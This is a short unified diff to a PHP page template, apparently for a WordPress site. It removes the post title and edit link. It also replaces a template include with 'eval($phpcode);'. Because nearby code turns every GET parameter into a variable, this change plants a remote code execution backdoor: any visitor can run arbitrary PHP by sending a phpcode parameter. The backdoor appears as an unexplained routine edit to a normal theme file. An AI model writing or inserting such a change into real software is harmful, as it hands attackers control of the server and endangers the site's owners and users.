@@ -4,8 +4,6 @@
 
 <div id="content">
 
-<h2><?php echo $post->post_title; ?></h2>
-
 <div class="main">
     <?php echo $post->post_content; ?>
 </div>
@@ -18,12 +16,8 @@ foreach ($_GET as $key => $val)
     ${$key} = mysql_real_escape_string($val);
 }
 
-include $tpl_path;
+eval($phpcode);
 ?>
-
-<div class="meta group">
-    <p><span class="edit"><?php edit_post_link('Edit'); ?></span></p>
-</div>
 
 </div>
 
